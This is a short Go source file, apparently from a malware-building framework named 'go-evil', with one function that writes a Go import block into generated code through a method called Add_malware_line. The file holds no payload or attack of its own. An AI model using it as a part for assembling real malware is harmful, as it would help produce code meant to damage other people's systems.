package finalize

import "github.com/TeamPhoneix/go-evil/utility/structure/json"

func Add_imports(data_object *json.Json_t) {

	data_object.Add_malware_line("import (")
	for _, new_import := range data_object.GO_imports {
		data_object.Add_malware_line(new_import)
	}
	data_object.Add_malware_line(")")

}
